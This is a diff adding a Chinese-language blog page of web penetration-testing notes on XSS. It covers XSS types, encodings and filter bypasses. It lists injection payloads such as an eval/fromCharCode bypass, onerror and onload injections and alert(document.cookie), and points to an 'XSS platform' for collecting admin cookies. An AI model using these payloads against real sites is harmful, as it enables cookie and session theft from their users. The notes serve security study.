@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Mist","version":"7.7.2","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="0x01 xss漏洞简述xss分类:反射型XSS：需要欺骗用户自己去点击攻击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web渗透笔记之xss漏洞">
+<meta property="og:url" content="http://yoursite.com/2019/04/03/eb%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E4%B9%8Bxss%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="yida223&#39; blog">
+<meta property="og:description" content="0x01 xss漏洞简述xss分类:反射型XSS：需要欺骗用户自己去点击攻击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/images/pasted-19.png">
+<meta property="article:published_time" content="2019-04-03T13:16:00.000Z">
+<meta property="article:modified_time" content="2019-08-09T16:07:06.542Z">
+<meta property="article:author" content="yida223">
+<meta property="article:tag" content="xss">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/images/pasted-19.png">
+
+<link rel="canonical" href="http://yoursite.com/2019/04/03/eb%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E4%B9%8Bxss%E6%BC%8F%E6%B4%9E/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>web渗透笔记之xss漏洞 | yida223' blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">yida223' blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/03/eb%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E4%B9%8Bxss%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yida223">
+      <meta itemprop="description" content="路漫漫其修远兮，吾将上下而求索">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yida223' blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          web渗透笔记之xss漏洞
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-04-03 21:16:00" itemprop="dateCreated datePublished" datetime="2019-04-03T21:16:00+08:00">2019-04-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2019-08-10 00:07:06" itemprop="dateModified" datetime="2019-08-10T00:07:06+08:00">2019-08-10</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B7%AF/" itemprop="url" rel="index"><span itemprop="name">渗透之路</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="0x01-xss漏洞简述"><a href="#0x01-xss漏洞简述" class="headerlink" title="0x01 xss漏洞简述"></a>0x01 xss漏洞简述</h2><h4 id="xss分类"><a href="#xss分类" class="headerlink" title="xss分类:"></a>xss分类:</h4><p><strong>反射型XSS</strong>：需要欺骗用户自己去点击攻击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。</p>
+<a id="more"></a>
+<p><strong>存储型XSS（危害大）</strong>：一般在个人资料或留言，<strong>图片上传文件名</strong>等地方存在此漏洞，这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookies<br><strong>DOM型XSS</strong>：基于文档对象模型Document Objeet Model，DOM的一种漏洞.DOM是一个与平台，编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容，结构和样式，处理后的结果能够成为显示页面的一部分.DOM中有很多对象，其中一些是用户可以操纵的，如uRI，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。（dom型xss算是特殊的反射型xss，例如搜索框搜索后，网页标题出现搜索的内容。于是可在<titele>标签内闭合，然后插入xss恶意代码）</p>
+<ul>
+<li><a href="https://xsspt.com/index.php" target="_blank" rel="noopener">xss平台</a>：有许多模块，当用户收到xss恶意代码时，可从xss平台获得管理员cookie（前提是目标站没有httponly防护）<h2 id="0×02-常用编码"><a href="#0×02-常用编码" class="headerlink" title="0×02 常用编码"></a>0×02 常用编码</h2></li>
+</ul>
+<p><strong>URL编码：</strong><br>一个百分号和该字符的ASCII编码所对应的2位十六进制数字，例如“/”的URL编码为%2F(一般大写，但不强求)，&amp;字符被过滤时可尝试url编码</p>
+<p><strong>HTML实体编码：</strong><br>命名实体：以&amp;开头，分号结尾的，例如“&lt;”的编码是“&lt;”</p>
+<p><strong>字符编码：</strong><br>十进制、十六进制ASCII码或unicode字符编码，样式为“&amp;#数值;”,例如“&lt;”可以编码为“&#060;”和“&#x3c;”</p>
+<p><strong>JS编码</strong>：js提供了四种字符编码的策略，</p>
+<blockquote>
+<p>1、三个八进制数字，如果不够个数，前面补0，例如“e”编码为“\145”<br>2、两个十六进制数字，如果不够个数，前面补0，例如“e”编码为“\x65”<br>3、四个十六进制数字，如果不够个数，前面补0，例如“e”编码为“\u0065”<br>4、对于一些控制字符，使用特殊的C类型的转义风格（例如\n和\r）</p>
+</blockquote>
+<hr>
+<p>例：<br>xss转16进制</p>
+<blockquote>
+<p>\x3C\x73\x63\x72\x69\x70\x74\x3E\x61\x6C\x65\x72\x74\x28\x27\x70\x6F\x72\x75\x69\x6E\x27\x29\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E</p>
+</blockquote>
+<p>xss转8进制</p>
+<blockquote>
+<p>\74\163\143\162\151\160\164\76\141\154\145\162\164\50\47\160\157\162\165\151\156\47\51\74\57\163\143\162\151\160\164\76</p>
+</blockquote>
+<p><strong>CSS编码</strong>：用一个反斜线()后面跟1~6位的十六进制数字，例如e可以编码为“\65”或“65”或“00065”<br><strong>复合编码</strong>：<br>所谓复合编码，也就是说输出的内容输出在多个环境中，例如</p>
+<pre><code>&lt;td onclick=”openUrl(add.do?userName=’&lt;%=value%&gt;’);”&gt;11&lt;/td&gt;</code></pre><p>value的内容首先出现在一个URL中，这个URL在一段javascript总，而javascript代码又是html的一部分。所以解码的顺序就是HTML解码–&gt;js解码–&gt;url解码，那么正确的编码顺序就应该是url编码–&gt;js编码–&gt;html编码。</p>
+<h2 id="0x03-绕过姿势"><a href="#0x03-绕过姿势" class="headerlink" title="0x03 绕过姿势"></a>0x03 绕过姿势</h2><h4 id="UBB标签"><a href="#UBB标签" class="headerlink" title="UBB标签"></a>UBB标签</h4><p>UBB标签是目前广泛运用到论坛，留言簿，以及其他网站系统的一种编码标签，类似[img]url[/img]这样的，用户在中间输入地址后即可，在发表的时候系统会自动改成 <code>&lt;img src=”url”&gt;&lt;/img&gt;</code>这个URL就是用户输入的图片地址，XSS攻击中，可以利用这个特点来达到无需用户输入&lt;&gt;就能执行由用户所输入的代码，我们只要在输入网址的地方输入：</p>
+<pre><code>x&quot;/**/onerror=&quot;alert(&apos;poruin&apos;)</code></pre><p>那么经过转换后就变成了</p>
+<pre><code>&lt;img src=&quot;x&quot;/**/onerror=&quot;alert(&apos;poruin&apos;)&quot;&gt;&lt;/img&gt;</code></pre><p>在JS中空格可以用/**/转换，如图：</p>
+<p><img src="/images/pasted-19.png" alt="upload successful"></p>
+<h4 id="JS还原函数"><a href="#JS还原函数" class="headerlink" title="JS还原函数"></a>JS还原函数</h4><ul>
+<li>JS中的编码还原函数最常用的就是String.fromCharCode了，这个函数用于ascii码的还原，一般来说，这个函数都要配合EVAL来使用才有效果。</li>
+<li>在跨站中，String.fromCharCode主要是使到一些已经被列入黑名单的关键字或语句安全通过检测，把关键字或语句转换成为ASCII码，然后再用String.fromCharCode还原，因为大多数的过滤系统都不会把String.fromCharCode加以过滤，例如关键字alert被过滤掉，那就可以这么利用：</li>
+</ul>
+<pre><code>&gt;&lt;img src=&quot;x&quot;/**/onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,39,112,111,114,117,105,110,39,41))&quot;&gt;&lt;/img&gt;</code></pre><h4 id="大小写或编码绕过"><a href="#大小写或编码绕过" class="headerlink" title="大小写或编码绕过"></a>大小写或编码绕过</h4><p>大小写</p>
+<pre><code>&lt;sCRipt&gt;aleRt(1)&lt;/sCRipt&gt;</code></pre><p>编码按照0x01所说<br>特别是浏览器解码顺序为</p>
+<blockquote>
+<ul>
+<li>html解码–&gt;js解码，则可将javascript:alert(/xss/)进行html编码</li>
+<li>浏览器解码顺序为js解码–&gt;html解码，可进行js编码，绕过htmlspecialchars限制</li>
+</ul>
+</blockquote>
+<h4 id="双重标签绕过"><a href="#双重标签绕过" class="headerlink" title="双重标签绕过"></a>双重标签绕过</h4><p>遇到script过滤时，用&lt;scrip<script>t>alert(/xss/)</script>绕过</p>
+<h4 id="非-lt-script-gt-标签绕过"><a href="#非-lt-script-gt-标签绕过" class="headerlink" title="非&lt;script&gt;标签绕过"></a>非<code>&lt;script&gt;</code>标签绕过</h4><ul>
+<li><code>&lt;img src=1 onerror=alert(2)&gt;</code></li>
+</ul>
+<pre><code>&lt;img type=image src=https://xsspt.com/qlk7io onerror
+=prompt(1)&gt;</code></pre><p>onerror后要换行</p>
+<p>和sql一样用闭合</p>
+<ul>
+<li><code>&quot;&gt;&lt;script&gt;;alert(2)&lt;/script&gt;&quot;&gt;</code> </li>
+<li><code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code></li>
+<li><code>&#39;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></li>
+<li><code>&lt;IFRAME SRC=javascript:alert(‘XSS’)&gt;&lt;/IFRAME&gt;</code> 框架注入</li>
+<li><code>&quot;&gt; &lt;BODY ONLOAD=&quot;a();&quot;&gt;&lt;SCRIPT&gt;function a(){alert(&#39;XSS&#39;);}&lt;/SCRIPT&gt;&lt;&quot;</code> </li>
+<li><code>&lt;A HREF=http://127.0.0.1/phpinfo.php&gt;link&lt;/A&gt;</code> //链接注入</li>
+</ul>
+<p>注：字段对输入字符有长度限制，这个可以通过burpsuite抓包改包绕过</p>
+<h2 id="受限情况下的-XSS-利用技巧"><a href="#受限情况下的-XSS-利用技巧" class="headerlink" title="受限情况下的 XSS 利用技巧"></a>受限情况下的 XSS 利用技巧</h2><p>原文地址:<a href="https://brutelogic.com.br/blog/xss-limited-input-formats/" target="_blank" rel="noopener">https://brutelogic.com.br/blog/xss-limited-input-formats/</a></p>
+<h4 id="电子邮件"><a href="#电子邮件" class="headerlink" title="电子邮件"></a>电子邮件</h4><p>payload:    <code>&quot;&lt;svg/onload=alert(1)&gt;&quot;@x.y</code></p>
+<h4 id="URL（无查询）"><a href="#URL（无查询）" class="headerlink" title="URL（无查询）"></a>URL（无查询）</h4><p>payload: <code>javascript://%250Aalert(1)</code></p>
+<h4 id="URL（带查询）"><a href="#URL（带查询）" class="headerlink" title="URL（带查询）"></a>URL（带查询）</h4><p>payload: <code>javascript://https://domain.com/%250A1?alert(1):0</code></p>
+<h4 id="Key"><a href="#Key" class="headerlink" title="Key"></a>Key</h4><p>payload(假设key限制条件为32字符的md5密钥): <code>12345678901&lt;svg onload=alert(1)&gt;</code></p>
+<p>部分转自：<a href="https://www.freebuf.com/articles/web/43285.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/43285.html</a><br>作者：0xExploit</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/xss/" rel="tag"># xss</a>
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/04/03/web%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E4%B9%8Bsql%E6%B3%A8%E5%85%A5%EF%BC%88%E8%BF%9B%E9%98%B6%E7%AF%87%EF%BC%89/" rel="prev" title="web渗透笔记之sql注入（进阶篇）">
+      <i class="fa fa-chevron-left"></i> web渗透笔记之sql注入（进阶篇）
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/04/05/web%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" rel="next" title="web渗透笔记之文件上传漏洞">
+      web渗透笔记之文件上传漏洞 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-xss漏洞简述"><span class="nav-number">1.</span> <span class="nav-text">0x01 xss漏洞简述</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#xss分类"><span class="nav-number">1.0.1.</span> <span class="nav-text">xss分类:</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0×02-常用编码"><span class="nav-number">2.</span> <span class="nav-text">0×02 常用编码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-绕过姿势"><span class="nav-number">3.</span> <span class="nav-text">0x03 绕过姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#UBB标签"><span class="nav-number">3.0.1.</span> <span class="nav-text">UBB标签</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JS还原函数"><span class="nav-number">3.0.2.</span> <span class="nav-text">JS还原函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#大小写或编码绕过"><span class="nav-number">3.0.3.</span> <span class="nav-text">大小写或编码绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#双重标签绕过"><span class="nav-number">3.0.4.</span> <span class="nav-text">双重标签绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#非-lt-script-gt-标签绕过"><span class="nav-number">3.0.5.</span> <span class="nav-text">非&lt;script&gt;标签绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#受限情况下的-XSS-利用技巧"><span class="nav-number">4.</span> <span class="nav-text">受限情况下的 XSS 利用技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#电子邮件"><span class="nav-number">4.0.1.</span> <span class="nav-text">电子邮件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#URL（无查询）"><span class="nav-number">4.0.2.</span> <span class="nav-text">URL（无查询）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#URL（带查询）"><span class="nav-number">4.0.3.</span> <span class="nav-text">URL（带查询）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Key"><span class="nav-number">4.0.4.</span> <span class="nav-text">Key</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">yida223</p>
+  <div class="site-description" itemprop="description">路漫漫其修远兮，吾将上下而求索</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yida223</span>
+</div>
+  <div class="powered-by">
+    <!--由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动-->
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
